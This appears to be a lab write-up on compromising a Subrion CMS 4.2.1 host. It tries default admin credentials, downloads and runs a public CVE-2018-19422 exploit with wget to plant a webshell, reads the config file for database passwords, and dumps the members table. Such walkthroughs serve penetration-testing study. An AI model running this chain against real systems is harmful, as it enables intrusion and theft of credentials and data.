# Subrion CMS

Subrion CMS 4.2.1 can lead to authenticated file upload RCE when valid admin credentials are available.

## Discovery

Check `robots.txt` and the admin panel:

```bash
curl http://exfiltrated.offsec/robots.txt
curl http://exfiltrated.offsec/panel/
```

Useful indicators from `/panel/`:

```text
intelli.config.admin_url = 'http://exfiltrated.offsec/panel';
Powered by Subrion CMS v4.2.1
```

## Default Credentials

Try the default admin login:

```text
Username: admin
Password: admin
```

## Authenticated Upload RCE

Subrion CMS 4.2.1 has an authenticated file upload bypass to RCE path.

```bash
wget https://raw.githubusercontent.com/Swammers8/SubrionCMS-4.2.1-File-upload-RCE-auth-/refs/heads/main/exploit.py
python3 exploit.py -u http://exfiltrated.offsec/panel -l admin -p admin
```

Successful output should show login and webshell upload:

```text
[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422
[+] Login Successful!
[+] Upload Success... Webshell path: http://exfiltrated.offsec/panel/uploads/RANDOM.phar
```

The shell lands as the web user:

```bash
whoami
# www-data
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
pwd
# /var/www/html/subrion/uploads
```

## Subrion Config and Database

Check the Subrion config for local database credentials:

```bash
cat /var/www/html/subrion/includes/config.inc.php
```

Useful values:

```php
define('INTELLI_CONNECT', 'mysqli');
define('INTELLI_DBHOST', 'localhost');
define('INTELLI_DBUSER', 'subrionuser');
define('INTELLI_DBPASS', 'target100');
define('INTELLI_DBNAME', 'subrion');
define('INTELLI_DBPORT', '3306');
define('INTELLI_DBPREFIX', 'sbr421_');
```

Enumerate the database:

```bash
mysql -u subrionuser -h localhost -p
# password: target100

use subrion;
show tables;
select * from sbr421_members\G
```

The admin account may confirm the web login path:

```text
username: admin
email: admin@exfiltrated.offsec
status: active
fullname: Administrator
```

## References

- https://github.com/Swammers8/SubrionCMS-4.2.1-File-upload-RCE-auth-
